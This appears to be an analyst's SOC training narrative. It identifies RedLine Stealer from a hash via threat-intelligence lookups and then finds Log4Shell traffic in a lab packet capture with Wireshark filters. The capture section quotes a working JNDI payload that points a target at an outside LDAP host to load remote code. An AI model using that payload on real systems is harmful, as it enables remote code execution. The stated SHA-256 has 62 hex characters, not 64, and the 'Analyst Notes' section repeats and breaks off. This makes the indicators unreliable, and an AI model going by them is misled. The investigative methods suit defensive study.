# Investigation Narrative - Day 32

## Initial Objective
A suspicious executable was discovered on a colleague's computer.
The initial task was to investigate its SHA-256 hash.
The objective was to identify the malware family and useful IOCs.
The investigation also aimed to identify C2 infrastructure.

## Hash Collection
The SHA-256 was:
`248FCC901AFFE4B4C8C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`
The hash was used as the primary lookup value.
Using a hash avoids relying only on filenames.

## VirusTotal Review
VirusTotal was checked using the available hash information.
The initial result displayed zero vendor detections for the searched object.
The searched object was a small text file containing the hash.
A clean result for the text file did not prove the referenced executable was benign.
Additional intelligence sources were therefore used.

## MalwareBazaar Review
The hash was searched in MalwareBazaar.
The resulting record identified RedLine Stealer.
The entry included hashes, metadata, vendor intelligence, and YARA matches.
The record provided stronger evidence than the text-file VirusTotal result.

## YARA Review
The MalwareBazaar entry contained RedLine-related signatures.
One rule was named:
`detect_Redline_Stealer`
Another rule identified a RedLine Stealer payload.
Other rules described PE and packing characteristics.
The YARA evidence strengthened the family assessment.

## ThreatFox Review
ThreatFox was used to investigate network indicators.
The investigation identified RedLine-related C2 intelligence.
The record contained an IP address and port.
The threat type was associated with botnet C2.
This provided infrastructure context for the malware family.

## PCAP Investigation
A separate practical exercise used:
`Challenge.pcap`
The capture was opened in Wireshark.
The packet list contained TCP and HTTP traffic.
The first step was to narrow the traffic using display filters.

## Port Filtering
The filter:
`tcp.dstport == 80`
identified TCP packets destined for port 80.
The filter:
`tcp.port == 80`
could match either source or destination port 80.
This reinforced the importance of direction.

## Payload Searching
The investigation searched for:
`31.131.16.127`
The payload filter used was:
`tcp contains "31.131.16.127"`
The results exposed HTTP requests containing the callback address.

## Log4Shell Identification
The HTTP request contained:
`${jndi:ldap://31.131.16.127:1389/Exploit}`
The pattern is consistent with Log4Shell exploitation.
The JNDI expression references an LDAP resource.
The callback address was embedded in the request.
The LDAP callback port was 1389.

## Address Interpretation
The callback IP did not have to appear in the packet IP header.
Therefore:
`ip.addr == 31.131.16.127`
could return no matching packets.
The payload search was more appropriate.
This was a key Wireshark troubleshooting lesson.

## Source Analysis
The filtered packet list showed source addresses.
The unique sources were:
`46.105.95.220`
`104.248.144.120`
The unique source count was 2.
Multiple packets were associated with the same sources.

## Packet Versus Entity Counting
A packet count measures matching packets.
An IP count measures unique addresses.
A single IP can generate many packets.
Therefore, unique-IP questions require deduplication.
This distinction is important in SOC reporting.

## Evidence Validation
The Source and Destination columns were inspected.
The HTTP request details were expanded.
The request URI was reviewed.
The packet bytes were available for confirmation.
The result was supported by multiple Wireshark views.

## SOC Interpretation
The HTTP payload provides a detection string.
The callback IP provides a network IOC.
The source IPs provide additional investigation leads.
The LDAP port provides another hunting value.
The traffic can be correlated with endpoint activity.

## Conclusion
The malware investigation identified RedLine Stealer.
The network investigation identified Log4Shell-style traffic.
The callback infrastructure was embedded in an HTTP request.
Two unique source IP addresses were observed.
The workflow demonstrated evidence-driven SOC analysis.

## Follow-up
Search endpoint telemetry for the malware hash.
Search proxy logs for the callback IP.
Search HTTP logs for the JNDI pattern.
Review outbound LDAP connections.
Correlate network indicators with process execution.
Preserve relevant evidence before remediation.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
Keep unique values separate from raw packet counts.
Use threat intelligence as enrichment rather than unquestioned truth.
Confirm high-impact findings before disruptive response.
Document both the final answer and the reasoning.
These notes are intended for future SOC investigations.
Repeatable investigation methods are more valuable than platform-specific tricks.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
